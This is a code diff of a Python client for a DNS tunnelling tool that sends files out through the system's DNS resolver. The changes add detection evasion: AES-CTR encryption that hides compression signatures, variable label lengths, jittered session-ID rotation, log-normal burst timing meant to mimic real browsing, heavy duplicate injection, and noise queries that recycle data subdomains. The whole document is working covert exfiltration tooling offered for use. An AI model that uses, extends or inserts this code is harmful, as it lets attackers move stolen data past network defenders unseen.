@@ -6,19 +6,23 @@ Uses the system's DNS resolver so traffic flows through normal DNS
 infrastructure, indistinguishable from regular browsing.
 
 Anti-detection features:
+- AES-CTR encryption (hides gzip signatures, uniform random output)
 - Gzip compression (60-80% fewer queries)
 - Low-entropy encoding (hex-split or wordlist)
+- Variable label lengths (avoids uniform query name sizes)
+- 100+ realistic CDN/SaaS prefixes
 - Sequence numbers XORed and embedded in data (no visible pattern)
-- Session ID rotation every N bursts (defeats correlation)
+- Session ID rotation with jitter (6-14 bursts, not fixed)
 - Domain rotation across multiple base domains
-- Poisson-distributed burst-silence timing
+- Log-normal burst-silence timing (matches real browsing)
 - Noise queries to real popular domains with cache-hit simulation
 - Weighted query type distribution (A/AAAA/CNAME)
-- Duplicate query injection to reduce unique ratio
+- 45% duplicate injection + subdomain recycling
 """
 
 import gzip
 import hashlib
+import math
 import os
 import random
 import secrets
@@ -36,11 +40,15 @@ from config import (
     COMPRESS_DATA,
     DUPLICATE_QUERY_RATE,
     ENCODING_STRATEGY,
+    ENCRYPT_DATA,
     HASH_ALGORITHM,
     HEX_LABEL_LENGTH,
+    HEX_LABEL_LENGTH_MAX,
+    HEX_LABEL_LENGTH_MIN,
     INTER_BURST_DELAY_MAX,
     INTER_BURST_DELAY_MEAN,
     INTER_BURST_DELAY_MIN,
+    INTER_BURST_DELAY_SIGMA,
     INTRA_BURST_DELAY,
     LABELS_PER_QUERY,
     METADATA_PREFIX,
@@ -49,8 +57,11 @@ from config import (
     QUERY_TYPE_WEIGHTS,
     SESSION_ID_LENGTH,
     SESSION_KEY_LENGTH,
-    SESSION_ROTATE_INTERVAL,
+    SESSION_ROTATE_MAX,
+    SESSION_ROTATE_MIN,
+    SUBDOMAIN_RECYCLE_RATE,
 )
+from crypto import encrypt
 from encoding import embed_sequence, encode_hex_split, encode_wordlist
 
 
@@ -77,7 +88,12 @@ def weighted_query_type():
 def encode_data(data):
     """Encode raw bytes into DNS labels using configured strategy."""
     if ENCODING_STRATEGY == "hex_split":
-        return encode_hex_split(data, label_len=HEX_LABEL_LENGTH)
+        return encode_hex_split(
+            data,
+            label_len=HEX_LABEL_LENGTH,
+            min_len=HEX_LABEL_LENGTH_MIN,
+            max_len=HEX_LABEL_LENGTH_MAX,
+        )
     elif ENCODING_STRATEGY == "wordlist":
         return encode_wordlist(data)
     else:
@@ -105,7 +121,6 @@ def build_query_name(data_labels, session_id, base_domain):
     """Build a DNS query name from components.
 
     Format: <data_labels>.<session_id>.<base_domain>
-    Sequence number is already embedded in the data labels.
     """
     parts = data_labels + [session_id, base_domain]
     return ".".join(parts)
@@ -129,23 +144,27 @@ def resolve_noise(domain, qtype=None):
 
 
 def inter_burst_delay():
-    """Generate Poisson-distributed inter-burst delay.
+    """Generate log-normal distributed inter-burst delay.
 
-    Uses exponential distribution (inter-arrival time of Poisson process)
-    clamped to [min, max] range for realism.
+    Log-normal better matches real browsing: many short pauses with
+    occasional long ones (reading, typing). More realistic than
+    exponential distribution.
     """
-    delay = random.expovariate(1.0 / INTER_BURST_DELAY_MEAN)
+    mu = math.log(INTER_BURST_DELAY_MEAN) - (INTER_BURST_DELAY_SIGMA ** 2) / 2
+    delay = random.lognormvariate(mu, INTER_BURST_DELAY_SIGMA)
     return max(INTER_BURST_DELAY_MIN, min(delay, INTER_BURST_DELAY_MAX))
 
 
 class SessionManager:
-    """Manages rotating session IDs with chaining for server correlation."""
+    """Manages rotating session IDs with jittered rotation interval."""
 
     def __init__(self):
         self.session_key = secrets.token_bytes(SESSION_KEY_LENGTH)
         self.current_id = secrets.token_hex(SESSION_ID_LENGTH // 2)
         self.burst_count = 0
         self.previous_ids = []
+        # Jittered rotation: random interval each time
+        self._next_rotate = random.randint(SESSION_ROTATE_MIN, SESSION_ROTATE_MAX)
 
     def get_session_id(self):
         return self.current_id
@@ -154,29 +173,22 @@ class SessionManager:
         return self.session_key
 
     def maybe_rotate(self):
-        """Rotate session ID every N bursts.
-
-        The new session ID encodes a chain token so the server
-        can link sessions together.
-        """
+        """Rotate session ID after a jittered number of bursts."""
         self.burst_count += 1
-        if self.burst_count >= SESSION_ROTATE_INTERVAL:
+        if self.burst_count >= self._next_rotate:
             self.previous_ids.append(self.current_id)
-            # New session ID is derived from key + old ID (server can verify)
             chain = hashlib.sha256(
                 self.session_key + self.current_id.encode()
             ).hexdigest()[:SESSION_ID_LENGTH]
             self.current_id = chain
             self.burst_count = 0
+            # Pick a new random interval for next rotation
+            self._next_rotate = random.randint(SESSION_ROTATE_MIN, SESSION_ROTATE_MAX)
             return True
         return False
 
     def get_chain_announcement(self, base_domain):
-        """Build a special query announcing a session rotation.
-
-        Format: <old_id>.<new_id>.<chain_marker>.<base_domain>
-        The chain_marker 'r' tells the server this is a rotation announcement.
-        """
+        """Build a special query announcing a session rotation."""
         if not self.previous_ids:
             return None
         old_id = self.previous_ids[-1]
@@ -205,13 +217,13 @@ def send_file(filepath):
 
     Protocol:
         1. Generate session ID and key
-        2. Read file, compress, compute hash, split into chunks
+        2. Read file, compress, encrypt, compute hash, split into chunks
         3. Embed XORed sequence numbers into each chunk
-        4. Send metadata query (seq 0): chunk_count||hash||compressed_flag
+        4. Send metadata query (seq 0): chunk_count||hash||compressed_flag||encrypted_flag
         5. Send data queries with embedded sequence numbers
-        6. Rotate session IDs and base domains periodically
-        7. Mix with noise queries in Poisson burst-silence pattern
-        8. Inject duplicate and cache-hit queries
+        6. Rotate session IDs and base domains with jittered intervals
+        7. Mix with noise queries in log-normal burst-silence pattern
+        8. Inject duplicates + recycle data subdomains as noise
     """
     with open(filepath, "rb") as f:
         file_data = f.read()
@@ -230,19 +242,25 @@ def send_file(filepath):
     else:
         send_data = file_data
 
-    chunks = chunk_data(send_data)
+    # Encrypt (hides gzip magic bytes, produces uniform random output)
+    encrypted = False
     session_mgr = SessionManager()
+    if ENCRYPT_DATA:
+        send_data = encrypt(send_data, session_mgr.get_session_key())
+        encrypted = True
+
+    chunks = chunk_data(send_data)
     domain_rotator = DomainRotator(BASE_DOMAINS)
     noise_domains = load_noise_domains()
 
-    # Select a subset of noise domains as "frequently visited" for cache simulation
+    # Select a larger subset of noise domains for cache simulation
     cache_favorites = random.sample(
         noise_domains, min(CACHE_HIT_DOMAINS, len(noise_domains))
     )
 
     compression_pct = (
         f" (compressed {100 - len(send_data) * 100 // len(file_data)}%)"
-        if compressed else ""
+        if compressed and not encrypted else ""
     )
     print(f"File: {filepath}")
     print(f"Size: {len(file_data)} bytes -> {len(send_data)} bytes{compression_pct}")
@@ -250,10 +268,16 @@ def send_file(filepath):
     print(f"Session: {session_mgr.get_session_id()}")
     print(f"Domains: {len(BASE_DOMAINS)}")
     print(f"Encoding: {ENCODING_STRATEGY}")
+    print(f"Encrypted: {encrypted}")
     print()
 
     # --- Send metadata first ---
-    metadata_str = f"{len(chunks)}||{file_hash}||{'1' if compressed else '0'}"
+    # Include encryption flag so server knows to decrypt
+    metadata_str = (
+        f"{len(chunks)}||{file_hash}"
+        f"||{'1' if compressed else '0'}"
+        f"||{'1' if encrypted else '0'}"
+    )
     meta_with_seq = embed_sequence(
         metadata_str.encode(), 0, session_mgr.get_session_key()
     )
@@ -275,7 +299,6 @@ def send_file(filepath):
     time.sleep(inter_burst_delay())
 
     # --- Prepare data queries ---
-    # Pre-encode all chunks with embedded sequence numbers
     encoded_queries = []
     for orig_seq, chunk in enumerate(chunks, start=1):
         chunk_with_seq = embed_sequence(
@@ -292,7 +315,7 @@ def send_file(filepath):
     total_sent = 0
     total_data = len(encoded_queries)
 
-    # --- Send in Poisson burst-silence pattern ---
+    # --- Send in log-normal burst-silence pattern ---
     order_idx = 0
     while order_idx < len(delivery_order):
         burst_size = random.randint(BURST_SIZE_MIN, BURST_SIZE_MAX)
@@ -313,15 +336,19 @@ def send_file(filepath):
             order_idx += 1
             total_sent += 1
 
-        # Maybe inject a duplicate of a previous query
+        # Duplicate injection (45% chance)
         if sent_qnames and random.random() < DUPLICATE_QUERY_RATE:
             dup = random.choice(sent_qnames)
             burst.append(("dup", dup))
 
+        # Subdomain recycling: replay old data qnames as "noise"
+        if sent_qnames and random.random() < SUBDOMAIN_RECYCLE_RATE:
+            recycled = random.choice(sent_qnames)
+            burst.append(("recycle", recycled))
+
         # Fill rest of burst with noise (maintain NOISE_RATIO)
         noise_count = max(burst_size - len(burst), data_in_burst * NOISE_RATIO)
         for _ in range(noise_count):
-            # Mix regular noise with cache-hit simulation
             if random.random() < CACHE_REPEAT_RATE:
                 domain = random.choice(cache_favorites)
             else:
@@ -344,15 +371,14 @@ def send_file(filepath):
 
             time.sleep(random.uniform(*INTRA_BURST_DELAY))
 
-        # Rotate session if needed
+        # Rotate session if needed (jittered interval)
         if session_mgr.maybe_rotate():
-            # Send a rotation announcement so the server can link sessions
             base_domain = domain_rotator.next()
             chain_qname = session_mgr.get_chain_announcement(base_domain)
             if chain_qname:
                 resolve_query(chain_qname, "A")
 
-        # Poisson inter-burst pause
+        # Log-normal inter-burst pause
         time.sleep(inter_burst_delay())
 
     print(f"\n\nTransfer complete.")
